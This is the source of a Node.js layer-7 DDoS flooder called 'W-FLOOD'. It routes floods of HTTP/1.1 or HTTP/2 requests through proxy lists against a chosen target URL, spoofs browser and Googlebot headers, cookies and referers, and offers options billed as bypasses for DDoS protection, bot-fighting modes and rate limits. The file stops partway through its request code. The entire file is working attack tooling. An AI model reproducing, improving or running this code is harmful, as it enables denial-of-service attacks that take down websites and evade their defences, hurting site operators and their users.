// W-FLOOD - L7 FLOODER
// Made with ❤️ by @Lexy_Tegyo
// Version 1.0.0

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const scp = require("set-cookie-parser");
const colors = require("colors");
const randomUseragent = require('random-useragent');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function getRandomTLSCiphersuite() {
  const tlsCiphersuites = [
    'TLS_AES_128_CCM_8_SHA256',
    'TLS_AES_128_CCM_SHA256',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_AES_128_GCM_SHA256',
  ];

  return tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];
}

const randomTLSCiphersuite = getRandomTLSCiphersuite();
const firefoxVersion = "119.0.1";

function generateRandomCookies() {
  const cookieNames = ['session', 'user_id', 'visitor', 'auth', 'preferences', 'PHPSESSID', 'csrf_token', 'theme', 'language', 'viewed_items'];
  const cookieValues = ['abc123', 'xyz789', 'user12345', 'true', 'false', crypto.randomBytes(8).toString('hex')];
  const domains = ['.example.com', '.google.com', '.facebook.com', '.amazon.com', '.github.com'];
  const paths = ['/', '/home', '/login', '/dashboard', '/settings'];
  
  const numCookies = Math.floor(Math.random() * 5) + 1;
  let cookieStr = '';
  
  for(let i = 0; i < numCookies; i++) {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const value = cookieValues[Math.floor(Math.random() * cookieValues.length)];
    cookieStr += `${name}=${value}; `;
  }
  
  return cookieStr.trim();
}

const referers = [
  'https://www.google.com/',
  'https://www.bing.com/',
  'https://www.yahoo.com/',
  'https://www.facebook.com/',
  'https://www.twitter.com/',
  'https://www.instagram.com/',
  'https://www.linkedin.com/',
  'https://www.reddit.com/',
  'https://www.youtube.com/',
  'https://www.amazon.com/',
  'https://www.netflix.com/',
  'https://www.baidu.com/',
  'https://www.wikipedia.org/',
  'https://www.live.com/',
  'https://www.naver.com/',
  'https://www.msn.com/',
  'https://www.pinterest.com/',
  'https://www.whatsapp.com/',
  'https://www.qq.com/',
  'https://www.tiktok.com/'
];

const googleBotUserAgents = [
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.97 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)',
  'Googlebot/2.1 (+http://www.google.com/bot.html)',
  'AdsBot-Google (+http://www.google.com/adsbot.html)',
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36'
];

const iOSUserAgents = [
  'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPod touch; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1'
];

const samsungUserAgents = [
  'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36'
];

const tabletUserAgents = [
  'Mozilla/5.0 (Linux; Android 10; SM-T860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; Lenovo TB-8505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; SM-T733) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
];

const randomPaths = [
  '/',
  '/index.html',
  '/about',
  '/contact',
  '/products',
  '/services',
  '/blog',
  '/faq',
  '/privacy-policy',
  '/terms-of-service',
  '/login',
  '/register',
  '/cart',
  '/checkout',
  '/category/electronics',
  '/category/clothing',
  '/search?q=popular+items',
  '/product/1234',
  '/news',
  '/events'
];

const secCHUAVariants = [
  '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
  '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
  '"Opera";v="105", "Chromium";v="119", "Not?A_Brand";v="24"',
  '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
  '"Firefox";v="119", "Not?A_Brand";v="24"'
];

const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store', 
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const language_header = [
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-US,en;q=0.5',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'da, en-gb;q=0.8, en;q=0.7',
  'cs;q=0.5',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8',
];

const fetch_site = [
  "same-origin",
  "same-site",
  "cross-site",
  "none"
];

const fetch_mode = [
  "navigate",
  "same-origin",
  "no-cors",
  "cors",
];

const fetch_dest = [
  "document",
  "sharedworker",
  "subresource",
  "unknown",
  "worker",
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
];

let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.SSL_OP_NO_TLSv1_3 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const argv = yargs(hideBin(process.argv))
  .usage('\x1b[31mUsage:\x1b[90m $0 <target> <time> <req> <thread> <proxy.txt> [options]\x1b[0m')
  .positional('target', {
    describe: '\x1b[90mTarget URL\x1b[0m',
    type: 'string'
  })
  .positional('time', {
    describe: '\x1b[90mAttack duration in seconds\x1b[0m',
    type: 'number'
  })
  .positional('req', {
    describe: '\x1b[90mRequest rate\x1b[0m',
    type: 'number'
  })
  .positional('thread', {
    describe: '\x1b[90mNumber of threads\x1b[0m',
    type: 'number'
  })
  .positional('proxy.txt', {
    describe: '\x1b[90mProxy file path\x1b[0m',
    type: 'string'
  })
  .option('l', {
    alias: 'legit',
    describe: '\x1b[90mEnable legit usual headers\x1b[0m',
    type: 'boolean'
  })
  .option('r', {
    alias: 'referer',
    describe: '\x1b[90mEnable random legit referers\x1b[0m',
    type: 'boolean'
  })
  .option('c', {
    alias: 'cookies',
    describe: '\x1b[90mEnable random cookies\x1b[0m',
    type: 'boolean'
  })
  .option('g', {
    alias: 'googlebot',
    describe: '\x1b[90mEnable fake googlebots (google crawlers) headers\x1b[0m',
    type: 'boolean'
  })
  .option('p', {
    alias: 'path',
    describe: '\x1b[90mEnable random path\x1b[0m',
    type: 'boolean'
  })
  .option('h', {
    alias: 'http',
    describe: '\x1b[90mChoose HTTP/1.1 or HTTP/2\x1b[0m',
    type: 'number',
    choices: [1, 2],
    default: 2
  })
  .option('s', {
    alias: 'secua',
    describe: '\x1b[90mEnable legit Sec-CH-UA headers\x1b[0m',
    type: 'boolean'
  })
  .option('m', {
    alias: 'method',
    describe: '\x1b[90mChoose request method\x1b[0m',
    type: 'string',
    choices: ['GET', 'POST', 'HEAD'],
    default: 'GET'
  })
  .option('d', {
    alias: 'data',
    describe: '\x1b[90mPOST data when using POST method\x1b[0m',
    type: 'string'
  })
  .option('u', {
    alias: 'uuid',
    describe: '\x1b[90mSet custom UUID\x1b[0m',
    type: 'string'
  })
  .option('x', {
    alias: 'random',
    describe: '\x1b[90mEnable all settings with random settings for each request\x1b[0m',
    type: 'boolean'
  })
  .option('0', {
    alias: 'bypass',
    describe: '\x1b[90mBypass HTTP-DDOS\x1b[0m',
    type: 'boolean'
  })
  .option('ios', {
    describe: '\x1b[90mEnable legit usual iOS headers and user agents\x1b[0m',
    type: 'boolean'
  })
  .option('samsung', {
    describe: '\x1b[90mEnable legit usual Samsung headers and user agents\x1b[0m',
    type: 'boolean'
  })
  .option('tablet', {
    describe: '\x1b[90mEnable legit usual Tablet headers and user agents\x1b[0m',
    type: 'boolean'
  })
  .option('ua', {
    alias: 'useragent',
    describe: '\x1b[90mSet custom user agent\x1b[0m',
    type: 'string'
  })
  .option('header', {
    describe: '\x1b[90mSet custom header (format: "Name: Value")\x1b[0m',
    type: 'string'
  })
  .option('referer', {
    describe: '\x1b[90mSet custom referer\x1b[0m',
    type: 'string'
  })
  .option('bfm', {
    describe: '\x1b[90mEnable bot fighting mode bypass\x1b[0m',
    type: 'boolean'
  })
  .option('xf', {
    describe: '\x1b[90mEnable all settings with random settings for each request but with all the existing requests methods in the world\x1b[0m',
    type: 'boolean'
  })
  .option('rapidreset', {
    describe: '\x1b[90mEnable rapidreset\x1b[0m',
    type: 'boolean'
  })
  .option('ratelimit', {
    describe: '\x1b[90mEnable and set bypass ratelimit per IP of the target site\x1b[0m',
    type: 'number'
  })
  .option('debug', {
    describe: '\x1b[90mEnable/disable debug\x1b[0m',
    type: 'boolean',
    default: false
  })
  .help()
  .argv;

if (!argv._ || argv._.length < 5) {
  console.log('\x1b[31mRequired arguments missing!\x1b[0m');
  yargs(hideBin(process.argv)).showHelp();
  process.exit(1);
}

const secureProtocol = "TLS_method";
const headers = {};

const secureContextOptions = {
  ciphers: ciphers,
  sigalgs: SignalsList,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  target: argv._[0],
  time: ~~argv._[1],
  Rate: ~~argv._[2],
  threads: ~~argv._[3],
  proxyFile: argv._[4],
  legit: argv.l || false,
  randomReferer: argv.r || false,
  cookies: argv.c || false,
  googlebot: argv.g || false,
  randomPath: argv.p || false,
  httpVersion: argv.h || 2,
  secua: argv.s || false,
  method: argv.m || 'GET',
  postData: argv.d || '',
  uuid: argv.u || '',
  random: argv.x || false,
  bypass: argv[0] || false,
  ios: argv.ios || false,
  samsung: argv.samsung || false,
  tablet: argv.tablet || false,
  userAgent: argv.ua || '',
  customHeader: argv.header || '',
  customReferer: argv.referer || '',
  bfm: argv.bfm || false,
  xf: argv.xf || false,
  rapidreset: argv.rapidreset || false,
  ratelimit: argv.ratelimit || 0,
  debug: argv.debug || false
};

const bypassMode = true;

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

function generateBFMBypass() {
  const timestamp = Date.now();
  const randomValue = Math.random().toString(36).substring(2, 15);
  const token = crypto.createHash('sha256').update(`${timestamp}:${randomValue}`).digest('hex');
  
  return {
    '_bfm_token': token,
    '_bfm_timestamp': timestamp.toString(),
    '_bfm_nonce': randomValue
  };
}

if (cluster.isMaster) {
  console.clear();
  console.log("\x1b[31m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\x1b[0m");
  console.log("\x1b[31m        W-FLOOD - L7 FLOODER\x1b[0m");
  console.log("\x1b[31m     Made with ❤️ by @Lexy_Tegyo\x1b[0m");
  
  console.log(`\x1b[90mTarget    :\x1b[0m \x1b[31m${args.target}\x1b[0m`);
  console.log(`\x1b[90mDuration  :\x1b[0m \x1b[31m${args.time} seconds\x1b[0m`);
  console.log(`\x1b[90mThreads   :\x1b[0m \x1b[31m${args.threads}\x1b[0m`);
  console.log(`\x1b[90mProtocol  :\x1b[0m \x1b[31m${args.httpVersion === 1 ? 'HTTP/1.1' : 'HTTP/2'}\x1b[0m`);
  console.log(`\x1b[90mMethod    :\x1b[0m \x1b[31m${args.method}\x1b[0m`);
  
  const enabledOptions = Object.entries(args)
    .filter(([key, value]) => value === true && key !== 'debug')
    .map(([key]) => key)
    .join(', ');
  console.log(`\x1b[90mOptions   :\x1b[0m \x1b[31m${enabledOptions || 'None'}\x1b[0m`);

  if (args.debug) {
    console.log(`\x1b[90mDebug     :\x1b[0m \x1b[31mENABLED\x1b[0m`);
  }

  process.stdout.write("\x1b[90mInitializing attack...\x1b[0m\n");

  setTimeout(() => {
    console.log("\x1b[31mAttack launched successfully!\x1b[0m");
    
    for (let counter = 1; counter <= args.threads; counter++) {
      cluster.fork();
    }
  }, 1000);
} else {
  for (let i = 0; i < args.Rate; i++) {
    setInterval(runFlooder, 500);
  }
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);
    
    const connection = net.connect({
      host: options.host,
      port: options.port,
      allowHalfOpen: true,
      writable: true,
      readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);
    
    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });
  }
}

function getRandomUserAgent() {
  if (args.userAgent) {
    return args.userAgent;
  }
  
  if (args.ios) {
    return randomElement(iOSUserAgents);
  }
  
  if (args.samsung) {
    return randomElement(samsungUserAgents);
  }
  
  if (args.tablet) {
    return randomElement(tabletUserAgents);
  }
  
  if (args.googlebot) {
    return randomElement(googleBotUserAgents);
  }
  
  const osList = ["Windows NT 10.0", "Macintosh", "X11", 'Windows NT 6.1; Win64; x64', 'Windows NT 5.1; Win64; x64', 'Macintosh; Intel Mac OS X 10_14_6', 'Macintosh; Intel Mac OS X 10_15_7', "Linux"];
  const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
  const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
  const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
  const manufacturerList = ['Mozilla/5.0'];
  
  const os = osList[Math.floor(Math.random() * osList.length)];
  const browser = browserList[Math.floor(Math.random() * browserList.length)];
  const language = languageList[Math.floor(Math.random() * languageList.length)];
  const country = countryList[Math.floor(Math.random() * countryList.length)];
  const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
  const version = `${firefoxVersion}`;
  const randomOrder = Math.floor(Math.random() * 6) + 1;
  
  return `${manufacturer} (${os}; ${country}; ${language}) ${browser}/${version}`;
}

function cookieString(cookie) {
  var s = "";
  for (var c in cookie) {
    s = `${s} ${cookie[c].name}=${cookie[c].value};`;
  }
  var s = s.substring(1);
  return s.substring(0, s.length - 1);
}

const Socker = new NetSocket();

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

const allMethods = [
  "GET",
  "POST",
  "PUT",
  "PATCH",
  "DELETE",
  "OPTIONS",
  "HEAD",
  "CONNECT",
  "COPY",
  "MKACTIVITY",
  "SEARCH",
  "MERGE",
  "MOVE",
  "SUBSCRIBE",
  "UNSUBSCRIBE",
  "REPORT",
  "PROPPATCH",
  "PROPFIND",
  "MKCOL",
  "ACL",
  "UPDATE",
  "UNLOCK",
  "LOCK",
];

function buildHeaders(parsedTarget) {
  let requestHeaders = {
    ":authority": parsedTarget.host,
    ":method": args.method,
    ":path": args.randomPath ? randomElement(randomPaths) : parsedTarget.path,
    ":scheme": "https"
  };
  
  if (args.bypass) {
    args.legit = true;
    requestHeaders["referer"] = randomElement(referers);
    
    requestHeaders["sec-fetch-dest"] = randomElement(fetch_dest);
    requestHeaders["sec-fetch-mode"] = randomElement(fetch_mode);
    requestHeaders["sec-fetch-site"] = randomElement(fetch_site);
    requestHeaders["sec-fetch-user"] = "?1";
    requestHeaders["upgrade-insecure-requests"] = "1";
    requestHeaders["accept-language"] = randomElement(language_header);
    requestHeaders["accept"] = randomElement(accept_header);
    requestHeaders["cache-control"] = randomElement(cache_header);
    
    if (args.debug) {
      console.log('[DEBUG] HTTP-DDOS bypass mode enabled with randomized headers');
    }
  }
  
  if (args.random) {
    args.legit = Math.random() > 0.5;
    args.randomReferer = Math.random() > 0.5;
    args.cookies = Math.random() > 0.5;
    args.googlebot = Math.random() > 0.5;
    args.secua = Math.random() > 0.5;
    args.method = randomElement(['GET', 'POST', 'HEAD']);
    args.ios = Math.random() > 0.5;
    args.samsung = Math.random() > 0.5;
    args.tablet = Math.random() > 0.5;
    args.bfm = Math.random() > 0.5;
  }
  
  if (args.xf) {
    args.legit = Math.random() > 0.5;
    args.randomReferer = Math.random() > 0.5;
    args.cookies = Math.random() > 0.5;
    args.googlebot = Math.random() > 0.5;
    args.secua = Math.random() > 0.5;
    args.method = randomElement(allMethods);
    args.ios = Math.random() > 0.5;
    args.samsung = Math.random() > 0.5;
    args.tablet = Math.random() > 0.5;
    args.bfm = Math.random() > 0.5;
  }
  
  requestHeaders[":method"] = args.method;
  
  requestHeaders["user-agent"] = getRandomUserAgent();
  
  // Force random user-agent on bypass mode
  if (args.bypass) {
    requestHeaders["user-agent"] = getRandomUserAgent();
  }
  
  requestHeaders["accept"] = randomElement(accept_header);
  
  requestHeaders["cache-control"] = randomElement(cache_header);
  
  requestHeaders["accept-language"] = randomElement(language_header);
  
  requestHeaders["accept-encoding"] = "gzip, deflate, br";
  
  if (args.legit || args.random || args.xf) {
    requestHeaders["sec-fetch-dest"] = randomElement(fetch_dest);
    requestHeaders["sec-fetch-mode"] = randomElement(fetch_mode);
    requestHeaders["sec-fetch-site"] = randomElement(fetch_site);
    requestHeaders["sec-fetch-user"] = "?1";
    requestHeaders["upgrade-insecure-requests"] = "1";
  }
  
  if (args.secua || args.random || args.xf) {
    requestHeaders["sec-ch-ua"] = randomElement(secCHUAVariants);
    requestHeaders["sec-ch-ua-mobile"] = "?0";
    requestHeaders["sec-ch-ua-platform"] = randomElement(["Windows", "macOS", "Linux", "Android"]);
  }
  
  if (args.customReferer) {
    requestHeaders["referer"] = args.customReferer;
  } else if (args.randomReferer || args.random || args.xf) {
    requestHeaders["referer"] = randomElement(referers);
  }
  
  if (args.cookies || args.random || args.xf) {
    requestHeaders["cookie"] = generateRandomCookies();
  }
  
  if (args.uuid) {
    requestHeaders["x-client-id"] = args.uuid;
  } else if (args.random || args.xf) {
    requestHeaders["x-client-id"] = generateUUID();
  }
  
  if (args.customHeader) {
    const [name, value] = args.customHeader.split(': ');
    if (name && value) {
      requestHeaders[name.toLowerCase()] = value;
    }
  }
  
  if (args.googlebot) {
    requestHeaders["user-agent"] = randomElement(googleBotUserAgents);
    requestHeaders["from"] = "googlebot(at)googlebot.com";
    requestHeaders["x-googlebot"] = "true";
  }
  
  if (args.bfm) {
    const bfmTokens = generateBFMBypass();
    Object.assign(requestHeaders, bfmTokens);
  }
  
  if (args.ios) {
    requestHeaders["user-agent"] = randomElement(iOSUserAgents);
    requestHeaders["x-requested-with"] = "com.apple.mobilesafari";
    requestHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
  }
  
  if (args.samsung) {
    requestHeaders["user-agent"] = randomElement(samsungUserAgents);
  }
  
  if (args.tablet) {
    requestHeaders["user-agent"] = randomElement(tabletUserAgents);
  }
  
  if (args.method === 'POST' && args.postData) {
    requestHeaders["content-type"] = "application/x-www-form-urlencoded";
    requestHeaders["content-length"] = Buffer.byteLength(args.postData).toString();
  }
  
  return requestHeaders;
}

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  
  let interval = randomIntn(2000, 6000);
  
  // Add jitter to interval for bypass mode
  if (args.bypass) {
    interval = interval + Math.floor(Math.random() * 1000);
  }
  
  if (args.debug) {
    console.log(`[DEBUG] Using proxy: ${proxyAddr}`);
    console.log(`[DEBUG] Request interval: ${interval}ms`);
  }
  
  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    "x-forwarded-for": parsedProxy[0],
    "origin": parsedTarget.protocol + "//" + parsedTarget.host,
    "referer": "https://" + parsedTarget.host + parsedTarget.path,
    timeout: 100
  };
  
  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) {
      if (args.debug) {
        console.log(`[DEBUG] Proxy connection error: ${error}`);
      }
      return;
    }

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
      enablePush: false,
      initialWindowSize: 1073741823
    };

    const tlsOptions = {
      port: parsedPort,
      secure: true,
      ALPNProtocols: args.httpVersion === 1 ? ['http/1.1'] : ["h2", 'http/1.1', "spdy/3.1"],
      ciphers: getRandomTLSCiphersuite(),
      sigalgs: sigalgs,
      requestCert: true,
      socket: connection,
      challengeToSolve: 15,
      clientTimeout: 20000,
      clientlareMaxTimeout: 15000,
      ecdhCurve: ecdhCurve,
      honorCipherOrder: false,
      decodeEmails: false,
      followAllRedirects: true,
      host: parsedTarget.host,
      rejectUnauthorized: false,
      secureOptions: secureOptions,
      secureContext: secureContext,
      servername: parsedTarget.host,
      secureProtocol: secureProtocol
    };

    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    let client;
    if (args.httpVersion === 1) {
      if (args.debug) {
        console.log('[DEBUG] Using HTTP/1.1');
      }
      
      const http = require('http');
      const agent = new http.Agent({
        keepAlive: true,
        maxSockets: Infinity,
        maxFreeSockets: Infinity
      });
      
      const requestHeaders = buildHeaders(parsedTarget);
      
      const options = {
        host: parsedTarget.host,
        agent: agent,
        headers: requestHeaders,
        path: requestHeaders[':path'],
        method: requestHeaders[':method'],
        timeout: 10000
      };
      
      delete requestHeaders[':authority'];
      delete requestHeaders[':method'];
      delete requestHeaders[':path'];
      delete requestHeaders[':scheme'];
      
      const performRequest = () => {
        const req = http.request(options, (res) => {
          if (args.debug) {
            console.log(`[DEBUG] HTTP/1.1 Response: ${res.statusCode}`);
